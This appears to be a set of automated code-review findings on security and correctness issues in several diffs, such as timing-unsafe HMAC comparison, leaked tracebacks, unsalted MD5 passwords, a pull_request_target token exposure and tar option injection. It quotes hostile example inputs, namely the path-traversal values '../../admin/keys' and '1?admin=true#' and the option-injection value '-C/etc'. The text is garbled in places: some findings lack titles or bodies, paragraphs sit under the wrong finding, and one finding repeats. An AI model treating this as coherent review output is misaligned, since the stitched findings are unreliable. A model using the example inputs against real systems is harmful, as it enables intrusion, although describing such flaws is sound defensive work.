findings.title: verify_acmepay compares HMAC with == instead of compare_digest
findings.body:
`verify_acmepay` computes the same hex-digest HMAC as `verify_stripe` but validates it with `expected == header`. Python's `str.__eq__` short-circuits on the first differing byte, so the comparison time leaks how many leading hex characters of the signature are correct; an attacker who can submit repeated webhook deliveries can recover a valid signature byte by byte without knowing the secret. The function directly above already does this correctly. Change line 12 to `return hmac.compare_digest(expected, header)` to match `verify_stripe` on line 7.

Note one behavioural difference to handle deliberately: `compare_digest` raises `TypeError` if `header` is `None` or `bytes` while `expected` is `str`, whereas `==` silently returns `False`. If callers can pass a missing header, coerce/validate it (e.g. `if not isinstance(header, str): return False`) before comparing rather than leaving the unsafe `==` in place.

_Also raised by the security agent:_ HMAC signature compared with `==` instead of compare_digest

findings.title: New verify_acmepay function has no test coverage
findings.body: The diff adds verify_acmepay, a security-sensitive signature-verification function, with no test exercising it (correct signature, incorrect signature, malformed header, etc.). No test file is included in this change. Without a test, a regression (e.g. wrong hash algorithm, broken comparison logic, or the string-equality comparison used here) would not be caught by CI.

findings.title: Public webhook verification function lacks docstring
findings.body: `verify_acmepay` is a public function (parallel to `verify_stripe`) that implements security-sensitive webhook verification. Its contract—what parameters it expects, what it returns, when it should be used—is not documented. A caller could misuse this function by passing arguments in the wrong order or misinterpreting the return value, especially given the signature mirrors but differs semantically from the adjacent `verify_stripe` function.

findings.title: Full traceback and exception text returned to HTTP clients on 500
findings.body:
`handle(exc)` previously returned a fixed `{"error": "internal error"}` body; it now serialises `str(exc)` plus `traceback.format_exc()` into the response. Any unauthenticated caller who can provoke an unhandled exception (malformed input, oversized payload, a probe against a rarely-exercised branch) gets back absolute filesystem paths, module and function names, source lines, and local framework internals. Exception strings frequently carry far more: DB driver errors echo connection strings and query fragments, HTTP client errors echo target URLs and sometimes Authorization headers, and `KeyError`/`ValueError` messages often echo the attacker's own input back alongside adjacent secrets. This is a reliable reconnaissance channel for mapping the deployment before a targeted attack.

The operational goal — on-call seeing what failed — is already met by the `log.exception("request failed")` on line 8, which puts the same traceback in the logs. Keep the client-facing body opaque and correlate via an ID:

```python
err_id = uuid.uuid4().hex
log.exception("request failed", extra={"error_id": err_id})
return {"error": "internal error", "error_id": err_id}, 500
```

If detail in the response is genuinely wanted for a staging environment, gate it on an explicit config flag that defaults to off in production rather than emitting it unconditionally.

_Also raised by the correctness agent:_ traceback.format_exc() uses ambient state, not the passed-in exc

_Also raised by the correctness agent:_ 500 response body shape and `error` value change for existing callers

findings.title: No test verifies handle() response contents
findings.body: The change alters the return value of handle() to include str(exc) and a full traceback in the response body. There is no test in this diff exercising handle() to confirm the response shape, so a regression (or a security fix reverting this exposure) would not be caught by any automated check.

findings.title: Reset path hashes passwords with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` returns `hashlib.md5(raw.encode()).hexdigest()`. MD5 is a fast, unsalted, GPU-friendly digest: an attacker with a dump of these values recovers plaintext passwords at billions of guesses per second, and identical passwords produce identical digests, so no per-user salt or work factor protects them. The same module already does this correctly on line 7 with `bcrypt.hashpw(raw.encode(), bcrypt.gensalt())`.

If this value is persisted as a credential, drop the function and call `hash_password` on the reset path so both paths share one KDF. If the intent was a single-use reset *token* rather than a password, it should not take a password at all — generate it with `secrets.token_urlsafe`, store `hashlib.sha256` of it, expire it, and compare with `hmac.compare_digest`.

Note also that a bcrypt verifier will never match an MD5 digest, so mixing the two will silently break login after a reset unless the caller special-cases it.

findings.title: Reset path stores MD5 digest incompatible with bcrypt verification
findings.body: `hash_password` returns a bcrypt hash (`$2b$...`), but the new `hash_reset_password` returns a bare 32-char MD5 hex digest. Any credential written through the reset flow is in a different format from every credential written through `hash_password`, so the existing verification path (presumably `bcrypt.checkpw`, which raises `ValueError: invalid salt` on a non-bcrypt hash, or at best returns False) will not authenticate a password set via reset. Either the reset flow must use `hash_password` so both writers produce the same format, or verification must be format-aware \u2014 and the former is the only option that keeps the stored hashes uniform. (This also downgrades reset-set passwords to an unsalted, fast digest, but the immediate functional defect is the format mismatch.)

findings.title: New password-reset hashing function has no test coverage
findings.body: hash_reset_password is a new public function introduced in this diff with no accompanying test. If its behavior regressed (e.g., wrong encoding, algorithm swapped, or hash truncated) nothing in the repository would catch it. Given the existing hash_password is presumably tested elsewhere in the suite, this sibling function should get at least a basic test verifying output shape/determinism.

findings.title: pull_request_target runs untrusted PR code with NPM_TOKEN
findings.body:
`pull_request_target` runs in the context of the base repository: it has access to repository secrets and a read/write `GITHUB_TOKEN`. The checkout on lines 11-12 explicitly pins `ref: ${{ github.event.pull_request.head.sha }}`, so the working tree is the contributor's code. `./scripts/measure.sh` on line 13 is therefore an attacker-controlled script, and line 15 injects `NPM_TOKEN` into its environment. Anyone who opens a PR from a fork can replace `scripts/measure.sh` with anything and exfiltrate the token (and use the write-scoped `GITHUB_TOKEN`).

To get CI signal on forks, keep the `pull_request` trigger — it already runs on forked PRs, just without secrets. If the measurement genuinely needs `NPM_TOKEN`, split it: a `pull_request` job that builds/measures untrusted code with no secrets, and a separate privileged step (e.g. `workflow_run`, or a `pull_request_target` job that checks out only the base ref and never executes PR-supplied files) that consumes the artifact.

_Also raised by the security agent:_ pull_request_target runs forked PR code with secrets (pwn request)

findings.title: Trigger change is not needed for the stated goal
findings.body: The PR description says the switch is needed "so external contributors get the same CI signal", but `pull_request` already fires for PRs opened from forks; the only thing it withholds is access to secrets and write permissions on `GITHUB_TOKEN`. So the trigger change does not fix the described problem — it only adds the secret exposure. If the real problem is that `./scripts/measure.sh` fails on forks because `NPM_TOKEN` is unset, the fix belongs in the script (skip the authenticated path / degrade gracefully) rather than in the trigger.

findings.title: json.dumps narrows accepted context to JSON-serialisable values
findings.body: The previous key, `tuple(sorted(context.items()))`, accepted any context whose keys were mutually comparable and whose values were hashable \u2014 including `datetime`, `Decimal`, `set`, tuples, and arbitrary objects defining `__hash__`. `json.dumps` raises `TypeError: Object of type X is not JSON serializable` for all of those, so any existing caller passing such a value now gets an exception from a function that previously rendered fine. If this is intentional, it needs `default=repr` (or similar) on the dump, or an explicit documented restriction; the docstring change on line 8 does not mention one. The new tests only exercise `int` values, so this regression would not be caught.

findings.title: No test for context values that aren't JSON-serializable or that collide under json.dumps
findings.body: The cache key changed from `tuple(sorted(context.items()))` (works for any hashable/orderable values) to `json.dumps([template_source, context], sort_keys=True)`. This changes what inputs are acceptable (non-JSON-serializable context values, e.g. objects, sets, or datetimes, now raise a TypeError instead of being cached) and can also make distinct-but-JSON-equivalent inputs collide (e.g. tuple vs list context values, or dict key order edge cases with non-string keys). None of the new tests exercise a context value that is not a plain JSON-safe type, so this behavior change would go unnoticed if it regressed further or if the JSON-serialization requirement is not intended by callers.

findings.title: MD5 cache key could be collided if template source is attacker-supplied
findings.body:
The cache key is now a truncating digest rather than the exact tuple of inputs, so two distinct (template_source, context) pairs that collide under MD5 will share a cache entry and the second caller gets the first caller's rendered output. MD5 chosen-prefix collisions are cheap, so this only matters if `template_source` or `context` can be influenced by an untrusted party — I could not see the callers of `cached_render`, so I cannot tell whether that is the case here.

If templates and contexts are entirely internal, this is a non-issue and MD5 is fine as a keying function (consider `hashlib.md5(..., usedforsecurity=False)` so it keeps working under FIPS-mode interpreters). If either input can come from a request, switch to `hashlib.sha256`, which costs nothing here and removes the question entirely.

findings.title: Test asserts only on mock kwarg, not on the actual argv
findings.body:
`test_runs_without_a_shell` only checks `spy.last_call.kwargs["shell"] is False`; it never inspects `spy.last_call.args` (the argv list). If someone reintroduces a vulnerable pattern such as building a single shell-string and passing it as the command while still setting `shell=False` (e.g. `["sh", "-c", f"tar ... {directory}"]`), this test would still pass even though the injection risk this PR is meant to fix would be back. Add an assertion on the actual argv list (e.g. that `directory` and `name` appear as separate, unmodified list elements) so the test can fail if the safe-argv contract regresses.

_Also raised by the correctness agent:_ `spy` fixture is not defined in this change

findings.title: create_archive now raises for names that previously worked
findings.body: `create_archive` previously accepted any `name` and interpolated it into the shell command. It now rejects anything that is not 1–64 characters of `[A-Za-z0-9_-]`. Callers passing names containing a dot (`report.2024`), a space, a slash-free but longer-than-64-character identifier, or a non-string (an int id would raise `TypeError` from `fullmatch`, not the documented `ValueError`) will now fail at runtime where they previously produced an archive. Either widen the allowlist to cover the naming shapes real callers use (and coerce/validate the type explicitly), or audit and update every call site — and note the new `ValueError` in the docstring so callers know it is part of the contract.

findings.title: `directory` reaches tar unvalidated; possible arbitrary-path archiving
findings.body:
`name` is now constrained by `SAFE_NAME.fullmatch`, but `directory` is passed straight through to `tar` as the source path. With `shell=False` and the `--` terminator this can no longer be command injection or option injection, so the hard part is fixed. What remains is that whatever caller supplies `directory` decides which directory on the host gets packed into `/exports/<name>.tar.gz` — e.g. `/etc` or `/root/.ssh` — and if `/exports` is subsequently downloadable by the requester that is an arbitrary file read.

If `directory` is ever derived from a request parameter, resolve it (`os.path.realpath`) and assert it stays under an allowed export root before calling `subprocess.run`. If every caller already passes a server-chosen constant, this is a no-op and worth a one-line docstring note instead.

findings.title: No test covers the `--` separator protecting against dash-prefixed directories
findings.body: The fix adds `"--"` before `directory` in the argv list specifically to stop a directory value like `-C/etc` from being interpreted as a tar option. No test exercises a directory argument beginning with `-` to confirm this protection actually works as intended.

findings.title: test_renders_empty_invoice has no assertion

The test calls `render(Invoice(lines=[]))` and then ends. It only fails if `render` raises, so any wrong output for the blank-invoice case (empty string, `None`, a stray header, a formatted total of `0.00` vs `""`) passes silently. Assert the expected rendered output explicitly, e.g. `assert render(Invoice(lines=[])) == "..."`, or if the intent really is "does not raise", state the contract you care about (e.g. that the result is a non-None string) so a regression is visible.

It never checks what render() actually produces (e.g. that the formatted lines appear in the output in the right order/format). If render() dropped the formatted results, mis-ordered them, or concatenated them incorrectly, this test would still pass as long as format_line was called twice.

findings.body:
`notify/sender.py` does `from notify.transport import deliver` at module import, so `send_with_retry` resolves `deliver` from its own module globals. Patching `notify.transport.deliver` rebinds the attribute on the transport module only; `notify.sender.deliver` still points at the original function. findings.title: csv_rows joins fields without calling csv_escape
findings.body: `csv_rows` builds each line with `",".join(str(r.get(c, "")) ...)` and never routes values through `csv_escape`, which is added two functions below in the same file for exactly this purpose. A row value such as `{"a": "Smith, John"}` emits an extra unquoted comma and shifts every subsequent column for that line, silently corrupting the output for any consumer that splits on commas. Wrap the value: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`. The same argument applies to `csv_header`, which joins column names raw.

findings.title: csv_rows never applies csv_escape, allowing CSV field/record injection
findings.body:
`csv_rows` builds each line with `",".join(str(r.get(c, "")) ...)` and never calls `csv_escape`, which is defined 3 lines below for exactly this purpose. Any row value containing a comma, a double quote or a newline silently shifts or splits columns in the emitted CSV, so a caller who controls one field value can forge additional fields or an entire additional record in the export that a downstream parser will accept as legitimate data.

Fix: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`, and extend `csv_escape` to quote values containing `\n` or `\r` as well (RFC 4180 requires it; the current condition only checks `,` and `"`). Using the stdlib `csv` module would remove the class of bug entirely. Separately, if these exports are opened in a spreadsheet, consider neutralising leading `=`, `+`, `-`, `@` to prevent formula injection.

I cannot see where `rows` originates — no caller appears in the diff or the retrieved context — so whether the values are attacker-influenced today is unverified; the escaping gap itself is unambiguous.

findings.title: New exporter functions added with no tests, unlike existing csv_header
findings.body: csv_rows, csv_escape, dump_streaming, dump_pretty, margins_for, and usable_width are all new public behaviours with non-trivial logic (chunking, escaping rules, margin arithmetic) but none are covered by any test in this diff. The repo already has a precedent (test_csv.py) of testing exactly this kind of pure function, so this isn't asking for a new policy — it's applying the existing one. If any of these has an off-by-one (e.g. csv_escape not quoting when a value contains only a quote but no comma correctly, or the streaming chunk boundary), nothing would catch it.

findings.title: csv_escape does not quote values containing newlines
findings.body: The predicate only tests for `,` and `"`. A value containing `\n` or `\r` is returned unquoted and will terminate the record early, so a single multi-line field turns one logical row into two physical rows. Add newline characters to the condition: `if any(ch in value for ch in ',"\n\r')`. (Also note the function assumes `value` is a `str`; `in` raises `TypeError` for an int or `None`, so callers must coerce first.)

findings.title: dump_streaming emits nothing for empty rows and fails on chunk_size=0
findings.body: For `rows == []`, `range(0, 0, chunk_size)` is empty so the generator yields no chunks at all — a consumer concatenating the output gets an empty stream rather than `"[]"`, which is a different shape from what `dump([])` returns. Decide which is intended and either yield `"[]"` for the empty case or document the emptiness. Separately, a caller passing `chunk_size=0` gets `ValueError: range() arg 3 must not be zero` from line 10 rather than a meaningful error; a guard for `chunk_size < 1` would be cheap.

findings.title: Test depends on wall clock; flaky across UTC midnight
findings.body:
`test_token_issued_today_is_valid` reads the system clock twice: once inside `issue_token()` and once in `datetime.now(timezone.utc).date()`. If the first call happens at 23:59:59.9xx UTC and the second just after midnight, the two dates differ and the assertion fails for no reason related to the code under test. The same applies to `is_expired(token.expires_at)` with no `now=` argument — it is evaluated against whatever the machine clock says.

The existing test on line 6 already shows the fix: construct a fixed `issued` instant and pass `now=` explicitly. Do the same here, e.g. inject a clock into `issue_token` or freeze time, and assert `token.issued_at == fixed_now` rather than comparing two independent `now()` reads. As written the test also never exercises the expiry window the PR describes — with a real clock, `not is_expired(token.expires_at)` is trivially true and cannot fail at the boundary.

findings.title: First argument to is_expired may not be an expiry instant
findings.body:
The existing test on line 6 passes `issued + timedelta(hours=2)` as the first positional argument and asserts the token *is* expired at `issued + 1h + 1s`. That result is only consistent if the first parameter is interpreted as an issue time (with the one-hour window applied internally), not as an expiry instant — under an expires-at reading, `now` is before the expiry and the assertion would fail. findings.title: No test covers the expired-coupon rejection branch

findings.title: Blocking requests.get inside async function stalls the event loop
findings.body:
`fetch_plan_limits` is declared `async` but never awaits anything; it calls the synchronous `requests.get` with a 5 second timeout. Because this runs on the event loop thread, every other coroutine on that loop — including unrelated in-flight requests — is frozen for up to 5 seconds per call. Under load this serialises the whole service.

Use the same async transport the module already depends on, e.g. accept an `httpx.AsyncClient` like `fetch_plan` does and `await client.get("https://billing.internal/limits/{tenant_id}", timeout=5)`. If a sync client is unavoidable, wrap it with `anyio.to_thread.run_sync` / `loop.run_in_executor` so it leaves the loop thread. The `import requests` on line 2 can then be dropped.

_Also raised by the docs agent:_ Async function makes blocking call without documentation

findings.title: No test covers fetch_plan_limits or its blocking-call behavior
findings.body: fetch_plan_limits is declared async but uses the synchronous `requests.get`, which blocks the event loop. There is no test in this diff exercising this function, so a regression (or the introduction of this blocking call itself) would go undetected. Since no test file is included, nothing would fail if this function were removed, changed to not use requests, or if the blocking call caused performance issues under concurrent load.

findings.title: Unencoded tenant_id interpolated into internal billing URL path
findings.body: `tenant_id` is dropped straight into the path of an internal, presumably unauthenticated service (`https://billing.internal/limits/{tenant_id}`) with no encoding or format check. If `tenant_id` is caller-supplied (e.g. taken from a request path/body rather than derived from a verified session), a value like `../../admin/keys` or `1?admin=true#` lets a caller steer the request to other endpoints on the internal billing host — requests/urllib3 do not collapse dot segments, so the server sees the traversal. Validate the identifier against its expected shape (UUID/integer) before use, or at minimum pass it through `urllib.parse.quote(tenant_id, safe='')`. Preferring the derived tenant from the authenticated session over a client-supplied one closes it entirely.

findings.title: Bare `except:` swallows KeyboardInterrupt/SystemExit and logs nothing
findings.body:
`except:` with no exception type catches `BaseException`, so `KeyboardInterrupt`, `SystemExit` and `GeneratorExit` raised while `_client.send` is running are absorbed and turned into a normal `return None`. That makes the process unkillable at this point and can convert a shutdown signal into a silently-continuing request. It also contradicts the PR description ("catch and log"): nothing is logged, so every transport failure becomes invisible.

Narrow it to the failure modes you actually mean (e.g. `except Exception:`, or better the client's transport/timeout exception) and emit a log record including the exception before returning.

_Also raised by the security agent:_ Bare except silently swallows push failures with no logging

findings.title: Public function's return contract is now undocumented
findings.body: The `push_metrics` function is a public API (it has no leading underscore) whose behaviour has changed materially: it now silently returns `None` on any exception, whereas before it would propagate exceptions. Callers cannot reliably know whether the push succeeded or failed, and code that depends on the return value or exception handling will behave incorrectly. Either document the new contract (what `None` means, what exceptions are caught, when they are caught) or add a docstring explaining the non-fatal retry semantics.

findings.title: No test verifies push_metrics swallows exceptions
findings.body: The whole point of this PR is that push_metrics should catch exceptions from _client.send and return None instead of propagating, so callers aren't broken by metrics failures. There is no test in this diff exercising the case where _client.send raises — nothing would fail if the bare except were removed, or if it were narrowed incorrectly, or if it accidentally caught and suppressed something it shouldn't. A test that makes _client.send raise and asserts push_metrics returns None (and does not raise) would catch a regression here.

findings.title: try_consume reads, awaits, then writes _counters without holding _lock
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` on line 15, checks against `LIMIT` on line 16, then yields to the event loop with `await asyncio.sleep(0)` on line 18 before writing back on line 19. Two consequences:

1. Rate limit bypass: N tasks for the same tenant can all read the same `current`, all pass the check on line 16, and all write — total consumption reaches `current + N*cost`, arbitrarily far above `LIMIT`.
2. Lost updates: line 19 assigns `current + cost` from the stale snapshot rather than re-reading, so any increment applied by `consume` (line 10) or another `try_consume` during the `await` is silently overwritten. The counter can go *down*, which permanently under-counts usage.

`consume` already guards exactly this dict with `async with _lock`, so the invariant the module intends is clear. Wrap the whole read/check/write in the same lock:

```python
async def try_consume(tenant, cost):
    async with _lock:
        current = _counters.get(tenant, 0)
        if current + cost > LIMIT:
            return False
        _counters[tenant] = current + cost
        return True
```

findings.title: Retry wraps non-idempotent charge(), risking duplicate charges
findings.body:
`billing.gateway.charge` is explicitly documented as NOT idempotent — each call creates a new charge — and the gateway offers an `Idempotency-Key` header to make retries safe. Alternatively, restrict retries to errors that are provably pre-send (e.g. connection-refused) rather than any exception. `fetch_charge` on line 6 is fine — `get_charge` is documented as safe to repeat — so the contrast makes the problem specific to this new function.

findings.title: Buffer reserved from unvalidated client Content-Length (memory exhaustion)
findings.body:
`contentLength` on this code path originates from the `Content-Length` header of the S3 `UploadPart` request, i.e. it is fully attacker-controlled and is a *declaration*, not a measurement. Passing it straight to `Reserve` makes the server commit that much memory before a single byte of the body has been read, so a client can send a handful of requests with `Content-Length: 5000000000` and a one-byte body and drive the process to OOM at effectively zero cost to itself. The previous `NewRW()` behaviour grew the buffer as data actually arrived, which bounded allocation by bytes genuinely transferred.

Suggested fix: clamp before reserving — reject or ignore non-positive values, and cap at the configured/S3 maximum part size, e.g. `if contentLength > 0 { rw.Reserve(min(contentLength, maxPartSize)) }`. Enforcing the same bound on the copy (`io.CopyN` / `http.MaxBytesReader`) also keeps a lying-upward body from exceeding it. A negative or absent `Content-Length` (`-1` for chunked/unknown) reaching `Reserve` is a second concern here, since it may panic or wrap inside the buffer implementation.

Any caller that never sets `request.meta["is_secure"]` — the default path — will have its S3 request, including the URL and any signed headers, sent over plaintext HTTP. Restore the explicit sentinel check, e.g. `scheme = "http" if request.meta.get("is_secure") is False else "https"`, or make the default explicit with `request.meta.get("is_secure", True)`.

The new expression `"https" if request.meta.get("is_secure") else "http"` defaults to HTTP whenever the meta key is absent, `None`, `0`, or `""` — i.e. for every request that does not deliberately set it.

The resulting URL on line 6 is the sink for an S3 request that carries AWS request-signing material (Authorization / X-Amz-* headers, or presigned query parameters carried in `p.query` on line 5). Over plaintext these, and the object bodies, are visible and modifiable to anyone on the network path, and a presigned signature observed in transit can be replayed until it expires.

Restore the fail-secure default, e.g. `scheme = "http" if request.meta.get("is_secure") is False else "https"`, so that only an explicit opt-out disables TLS.

findings.body: The config.go header documents that three actions (pull, push, delete) are intentionally distinct: 'an account may be allowed to push new tags without being allowed to delete existing ones.' However, this diff collapses DELETE requests into the push action, making the delete action unreachable. Callers or policy configurations relying on the delete action will silently receive push instead, breaking the documented authorization model.

findings.title: No test guards DELETE-method-to-action mapping change
findings.body: The change removes the distinct 'delete' action and maps HTTP DELETE to 'push' instead. The repository's own docs (pkg/api/config/config.go) state the three actions are intentionally distinct so an account can push without being able to delete. This diff contains no test file, so if this mapping is wrong (e.g. it should remain 'delete', or should require a separate permission check), nothing in the test suite would fail to catch it.

findings.title: Unknown methods (e.g. OPTIONS) default to "push" instead of "pull"
findings.body: The old `default:` arm assigned `"pull"` for any method outside the enumerated set; the new negative condition sends every non-GET/HEAD method — including OPTIONS and TRACE — down the `"push"` branch. Read-only clients performing a CORS preflight or capability probe will now be required to hold push access and will be rejected. If the intent is to keep the permissive default, enumerate the write methods explicitly rather than negating the read methods.

findings.title: Cache flush discards the entry just written by this call
findings.body: After storing `tenant` at line 10, the size check at line 11 can immediately `_CACHE.clear()`, wiping the entry that was just inserted (and every other tenant). A caller that does `get_tenant_fresh(id)` and then `get_tenant(id)` — the evident reason for having both functions — gets `None` on the second call whenever the flush triggers. The flush also evicts all 1000 other tenants at once, so every subsequent `get_tenant` misses until callers re-populate. If the intent is bounded growth, evict selectively (e.g. pop the oldest key, or use an `OrderedDict`/LRU) and do it before inserting the fresh value, so the newly fetched entry survives.

findings.title: No test for get_tenant_fresh caching/eviction behavior
findings.body: get_tenant_fresh introduces new behavior: it fetches fresh data, writes it into the shared _CACHE, and clears the entire cache once it exceeds 1000 entries. None of this is exercised by any test in the diff, so a bug (e.g. wrong eviction threshold, clearing instead of evicting oldest entries, or failing to update the cache) would not be caught.

findings.title: Unvalidated tenant_id lets a caller flush the shared cache
findings.body:
`get_tenant_fresh` inserts `tenant_id` into the module-level `_CACHE` with no validation that the id exists or that the caller is entitled to it, and then wipes the entire cache when it exceeds 1000 entries. If `tenant_id` is reachable from a request parameter, iterating over 1000 arbitrary (even nonexistent) ids evicts every other tenant's entry, converting a cheap request loop into a cache-stampede against whatever backend `_fetch` talks to. It also means a failed or empty `_fetch` result is stored and subsequently served by `get_tenant` on line 5.

Suggested fixes: validate/authorise `tenant_id` before it becomes a cache key, skip caching falsy `_fetch` results, and replace the wholesale `clear()` with bounded eviction (e.g. an LRU) so one caller cannot discard other tenants' entries.

findings.title: Stale documentation references renamed flag
findings.body: Line 7 documents the `--workers` flag, but the CLI has been renamed to `--concurrency` in this change. Update the documentation to match the new flag name so users see the correct invocation.

findings.title: Renaming --workers changes argparse dest and breaks existing callers
findings.body: `p.add_argument("--workers", ...)` produced a namespace attribute `args.workers`; the new `--concurrency` produces `args.concurrency`. Every consumer of the parsed namespace that reads `args.workers` will now raise `AttributeError` at runtime, and every existing script, Makefile, CI job or container command line passing `--workers N` will fail with `unrecognized arguments`. If the stated intent is only to align the user-facing name with the internal one, either (a) keep the old attribute name via `p.add_argument("--concurrency", dest="workers", ...)` and update no consumers, or (b) update all consumers and add a deprecated alias, e.g. `p.add_argument("--workers", dest="concurrency", type=int, help=argparse.SUPPRESS)`, so existing invocations keep working through a deprecation period. The diff contains no consumer updates and no alias, so nothing here indicates the rename was propagated.

findings.title: Docstring contradicts new return type
findings.body: The docstring states the function returns 'the total number of API calls this month as an integer', but the implementation now returns a dictionary mapping days to call counts. A caller reading the docstring and expecting an integer will pass this to code expecting int operations, causing a runtime error. Update the docstring to match the new contract: something like 'Return a dictionary mapping day to call count for this month'.

findings.title: Return type changed from int to dict with no caller migration
findings.body: `monthly_usage` previously returned a scalar integer (`_db.scalar(...)`) and now returns `{day: count}`. The function name and signature are unchanged, so any existing caller doing arithmetic, comparison or formatting on the result (e.g. `monthly_usage(a) > limit`, `f"{monthly_usage(a)} calls"`) will now silently operate on a dict — producing a `TypeError` at best and a wrong billing/limit decision at worst. Either keep the total available (return both, or add a new `daily_usage` function) or update every call site in the same change. The docstring on line 2 still promises "the total number of API calls this month as an integer", which is now false and confirms no caller contract was renegotiated.

findings.title: Return type change untested
findings.body: monthly_usage now returns a dict keyed by day instead of an integer total, but no test accompanies this change. If the query, grouping, or dict construction were wrong (e.g. wrong key names, incorrect aggregation, or empty rows), nothing would catch it. Add a test that calls monthly_usage against known data and asserts the returned dict has the expected day->count mapping.

findings.title: Renaming page_size to limit breaks keyword-argument callers
findings.body: `list_invoices` previously accepted `page_size` as its second parameter; it is now `limit`. Any existing caller written as `list_invoices(tid, page_size=100)` will now raise `TypeError: unexpected keyword argument 'page_size'` at runtime — positional callers are unaffected, so the breakage is silent until that specific call path executes. No callers were retrieved for this review, so this needs to be checked against the repository: either update every keyword call site in the same change, or keep backwards compatibility (e.g. accept `page_size=None` as a deprecated alias that maps onto `limit`) for one release. Note also that the PR description says the parameter is being renamed from `page` to `offset`, which does not match what the diff actually does (`page_size` -> `limit`) — worth confirming which change was intended before merging.

findings.title: Docstring references renamed parameter by old name
findings.body: The function parameter `page_size` has been renamed to `limit` on line 1, but the docstring on line 6 still refers to it as `page_size`. This will mislead callers reading the documentation. Update the docstring to match the new parameter name.

findings.title: Parameter rename to `limit` has no visible test coverage
findings.body: The function signature's keyword argument was renamed from `page_size` to `limit`, which is a breaking change for any caller using the keyword form (e.g. `list_invoices(tenant_id, page_size=10)`). No test file is part of this diff, so it's unclear whether any existing test calls this function with the old keyword name and would now fail, or whether tests use positional args and would silently continue to pass despite the rename.

findings.title: Non-relative import of `adapters` will fail at import time
findings.body: Every other intra-package import in this module is relative (`from .utils import ...`, `from .packages.urllib3.poolmanager import PoolManager`). `from adapters import HTTPAdapter` is an absolute import that only resolves if a top-level module named `adapters` exists on `sys.path`; under Python 3 (no implicit relative imports) importing `requests.sessions` — and therefore `requests` — raises `ImportError`. Change it to `from .adapters import HTTPAdapter`.

findings.title: verify/cert silently ignored on new request->send path
findings.body:
The rewritten `request()` still advertises `verify=None` and `cert=None` in its signature, but the body only copies method/url/headers/files/data/params/auth/cookies/redirects/proxies/hooks onto the `Request` and then calls `self.send(prep)`. Neither `verify` nor `cert` (nor `timeout`) reaches `send()`, and `send()` itself constructs a bare `HTTPAdapter()` and calls `adapter.send(request)` with no TLS arguments. A caller who does `session.get(url, verify='/etc/ssl/corp-ca.pem')` — or who relies on the session config for verification — gets whatever the adapter's hard-coded default is, with no error. If that default is not full verification, every HTTPS request made through this path is open to an active network attacker (MITM); if it is, custom CA bundles and client certificates are still silently discarded, which breaks mutual-TLS callers without any signal. Thread `verify`, `cert` and `timeout` through `send()` into `adapter.send()`, or remove them from the signature so the loss is loud rather than silent.

I cannot see `adapters.HTTPAdapter` in the provided context, so the exact default is unknown — hence the reduced confidence — but the dropping of an explicitly requested verification parameter is visible entirely within this diff.

findings.title: `_send_request` deleted but `old_request` still calls it
findings.body: The `_send_request` helper was removed in this diff, yet the retained `old_request` path still ends with `return self._send_request(r, **args)`. Any call that reaches `old_request` now raises `AttributeError: 'Session' object has no attribute '_send_request'`. Either keep the helper until `old_request` is deleted, or inline `r.send(prefetch=...)`/`return r.response` at the call site.

findings.title: New `request()` silently ignores timeout, verify, cert, prefetch, config, return_response
findings.body: The new `request()` keeps the full public signature but only transfers method/url/headers/files/data/params/auth/cookies/allow_redirects/proxies/hooks onto the `Request`. `timeout`, `verify`, `cert`, `prefetch`, `config` and `return_response` are accepted and then dropped on the floor, and `self.send(prep)` takes no such arguments. Existing callers doing `session.get(url, timeout=5)` or `verify=False` will get a silently different behaviour (no timeout, certificate verification defaults) rather than an error. It also no longer merges session-level defaults (`self.headers`, `self.params`, `self.auth`, `self.cookies`, `self.hooks`) that the old path merged, so a configured Session stops applying its configuration. Either thread these through to `send()`/the adapter, or raise for unsupported arguments while the refactor is in flight.

findings.title: New HTTPAdapter per send, and close() no longer releases connections
findings.body: `send()` constructs a fresh `HTTPAdapter()` on every request. Since the adapter owns the PoolManager in this refactor, each request gets a brand-new connection pool: connection reuse/keep-alive across requests through a Session is lost, and the adapter (and its sockets) is never closed, so connections accumulate until GC. In the same change `close()` was reduced to `pass`, so `with Session() as s:` / `s.close()` no longer disposes of anything — the previous `self.poolmanager.clear()` cleanup is gone with no replacement. Store one adapter on the Session (e.g. in `__init__`) and have `close()` close it.

findings.title: Refactored send/close/request paths have no test coverage
findings.body: This diff makes close() a no-op (previously cleared the PoolManager), routes send() through a new HTTPAdapter class instead of PreparedRequest.send(), and rewrites request() to build/prepare a Request differently. None of these changed code paths have accompanying tests in the diff, so if HTTPAdapter.send() returns the wrong thing, or if close() silently failing to release connections causes a leak, nothing would fail. Given this is described as a mid-refactor, at minimum a test exercising Session.send()/request() end-to-end (or asserting close() behavior) is needed to catch a broken handoff to the new adapter.

findings.title: `init_poolmanager`/`self.poolmanager` removed; external users and `models` may still rely on them
findings.body: `init_poolmanager()` and the `self.poolmanager` attribute are removed from `Session.__init__`. `init_poolmanager` was a documented extension point (subclasses override it to inject a custom PoolManager, e.g. for SSL settings), and `Request.send()` in `models.py` historically reads `self.session.poolmanager`. Anything still on the `old_request` path, or any subclass overriding `init_poolmanager`, will now hit `AttributeError`. Also note `PoolManager` is now imported (line 19) but unused. Worth confirming no remaining reader of `session.poolmanager` before this lands.

findings.title: cookies returns None on parse failure, breaking all callers
findings.body:
When `SimpleCookie.load()` raises, the new property assigns `self._cookies = None` and returns it (and caches it, since `hasattr(self, "_cookies")` is then true). Every consumer treats the return value as a mapping: `get_cookie` does `if name in self.request.cookies` (TypeError: argument of type 'NoneType' is not iterable) and `clear_all_cookies` does `self.request.cookies.iterkeys()` (AttributeError). A malformed `Cookie:` header from any client therefore turns into a 500 on the first cookie access. The old code kept `_cookies` a valid `SimpleCookie` and used `clear_all_cookies()` as the recovery path. Reset to an empty `Cookie.SimpleCookie()` on failure instead of `None`.

_Also raised by the security agent:_ Malformed Cookie header makes request.cookies None, crashing get_cookie

findings.title: RequestHandler.cookies removed without a delegating alias
Docstring does not document None return on parse error
findings.body: The docstring states the property returns "A dictionary of Cookie.Morsel objects," but the implementation can return `None` when cookie parsing fails (line 523). A caller reading only the docstring would expect a dict-like object and could fail if they attempt to iterate or use dictionary methods on the result. The docstring must document this possibility.

findings.title: Malformed-cookie failure path changed silently, uncovered by tests
